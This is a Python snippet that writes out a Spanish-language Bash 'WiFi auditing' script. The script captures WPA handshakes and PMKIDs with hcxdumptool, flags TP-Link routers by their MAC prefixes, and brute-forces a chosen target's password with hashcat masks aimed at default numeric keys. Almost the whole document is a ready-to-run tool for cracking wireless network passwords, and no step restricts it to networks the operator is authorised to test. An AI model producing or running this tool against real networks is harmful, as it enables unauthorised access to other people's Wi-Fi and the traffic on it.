
# Create an alternative version with standalone commands (non-interactive)
standalone_script = """#!/bin/bash

# WiFi Auditing Tool - Standalone Command Version
# Description: Non-interactive version with standalone commands

# Colors for output
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m' # No Color

print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }

check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "Este script debe ejecutarse como root (sudo)"
        exit 1
    fi
}

get_tplink_oui() {
    echo "00:31:92 00:5F:67 10:27:F5 14:EB:B6 1C:61:B4 20:23:51 F4:F5:0B"
    echo "24:2F:D0 28:87:BA 30:DE:4B 34:60:F9 3C:52:A1 40:ED:00 48:22:54"
    echo "50:91:E3 54:AF:97 5C:A6:E6 60:A4:B7 68:7F:F0 6C:5A:B0 7C:C2:C6"
    echo "80:3C:04 8C:86:DD 94:EF:50 98:25:4A 9C:A2:F4 A8:42:A1 AC:15:A2"
    echo "B0:A7:B9 B4:B0:24 C0:06:C3 CC:68:B6 D8:F1:2E E0:28:0A E8:48:B8"
    echo "F0:09:0D F0:A7:31 E4:9A:79 44:D1:FA 08:57:00 0C:80:63 14:CF:92"
}

is_tplink() {
    local mac=$1
    local mac_prefix=$(echo "$mac" | cut -d: -f1-3 | tr '[:lower:]' '[:upper:]')
    local tplink_ouis=$(get_tplink_oui)
    
    for oui in $tplink_ouis; do
        if [[ "$mac_prefix" == "$(echo $oui | tr '[:lower:]' '[:upper:]')" ]]; then
            return 0
        fi
    done
    return 1
}

show_usage() {
    echo "Uso: $0 <comando> [argumentos]"
    echo ""
    echo "Comandos:"
    echo "  analyze <interfaz> <archivo.pcapng>  - Captura y analiza tráfico WiFi"
    echo "  lsmac <archivo.maclist>              - Lista MACs capturadas"
    echo "  attack <archivo.hc22000> <mac> <mask> - Ataca una MAC específica"
    echo ""
    echo "Ejemplos:"
    echo "  $0 analyze wlan0 captura.pcapng"
    echo "  $0 lsmac captura.maclist"
    echo "  $0 attack captura.hc22000 aa:bb:cc:dd:ee:ff ?d?d?d?d?d?d?d?d"
}

cmd_analyze() {
    local interface=$1
    local output_file=$2
    
    if [[ -z "$interface" || -z "$output_file" ]]; then
        print_error "Uso: $0 analyze <interfaz> <archivo_salida.pcapng>"
        exit 1
    fi
    
    check_root
    
    print_info "Deteniendo servicios..."
    systemctl stop NetworkManager 2>/dev/null
    systemctl stop wpa_supplicant 2>/dev/null
    
    print_info "Iniciando captura (Ctrl+C para detener)..."
    hcxdumptool -i "$interface" -w "$output_file" -F --rds=1
    
    print_info "Reiniciando servicios..."
    systemctl start wpa_supplicant 2>/dev/null
    systemctl start NetworkManager 2>/dev/null
    
    local hash_file="${output_file%.pcapng}.hc22000"
    local essid_file="${output_file%.pcapng}.essid"
    local mac_file="${output_file%.pcapng}.maclist"
    
    print_info "Convirtiendo a formato hashcat..."
    hcxpcapngtool -o "$hash_file" -E "$essid_file" "$output_file"
    
    print_info "Extrayendo MACs..."
    > "$mac_file"
    
    while IFS= read -r line; do
        if [[ $line == WPA* ]]; then
            mac=$(echo "$line" | cut -d'*' -f3)
            essid_hex=$(echo "$line" | cut -d'*' -f6)
            essid=$(echo "$essid_hex" | xxd -r -p 2>/dev/null)
            [[ -z "$essid" ]] && essid="<hidden>"
            
            mac_formatted=$(echo "$mac" | sed 's/\\(.\\{2\\}\\)/\\1:/g' | sed 's/:$//')
            
            if is_tplink "$mac_formatted"; then
                echo "$mac_formatted:$essid:TP-LINK" >> "$mac_file"
            else
                echo "$mac_formatted:$essid:OTHER" >> "$mac_file"
            fi
        fi
    done < "$hash_file"
    
    print_success "Análisis completado"
    print_info "Hash: $hash_file"
    print_info "MACs: $mac_file"
}

cmd_lsmac() {
    local mac_file=$1
    
    if [[ -z "$mac_file" ]]; then
        print_error "Uso: $0 lsmac <archivo.maclist>"
        exit 1
    fi
    
    if [[ ! -f "$mac_file" ]]; then
        print_error "Archivo no encontrado: $mac_file"
        exit 1
    fi
    
    printf "%-20s %-30s %-10s\\n" "MAC ADDRESS" "SSID" "VENDOR"
    printf "%-20s %-30s %-10s\\n" "----" "----" "------"
    
    while IFS=: read -r mac essid vendor; do
        printf "%-20s %-30s %-10s\\n" "$mac" "$essid" "$vendor"
    done < "$mac_file"
}

cmd_attack() {
    local hash_file=$1
    local target_mac=$2
    local mask=$3
    
    if [[ -z "$hash_file" || -z "$target_mac" || -z "$mask" ]]; then
        print_error "Uso: $0 attack <archivo.hc22000> <mac> <máscara>"
        exit 1
    fi
    
    check_root
    
    local mac_no_colons=$(echo "$target_mac" | tr -d ':' | tr '[:upper:]' '[:lower:]')
    local target_hash="hash_${mac_no_colons}.hc22000"
    
    grep -i "$mac_no_colons" "$hash_file" > "$target_hash"
    
    if [[ ! -s "$target_hash" ]]; then
        print_error "No se encontró hash para: $target_mac"
        rm -f "$target_hash"
        exit 1
    fi
    
    print_info "Atacando $target_mac con máscara: $mask"
    hashcat -m 22000 "$target_hash" -a 3 "$mask"
}

# Main
case "$1" in
    analyze)
        shift
        cmd_analyze "$@"
        ;;
    lsmac)
        shift
        cmd_lsmac "$@"
        ;;
    attack)
        shift
        cmd_attack "$@"
        ;;
    *)
        show_usage
        exit 1
        ;;
esac
"""

with open('/tmp/wifi_audit_standalone.sh', 'w') as f:
    f.write(standalone_script)

print("Script standalone guardado en: /tmp/wifi_audit_standalone.sh")
print("\nEste script funciona con comandos independientes:")
print("- sudo ./wifi_audit_standalone.sh analyze wlan0 captura.pcapng")
print("- ./wifi_audit_standalone.sh lsmac captura.maclist")
print("- sudo ./wifi_audit_standalone.sh attack captura.hc22000 AA:BB:CC:DD:EE:FF ?d?d?d?d?d?d?d?d")
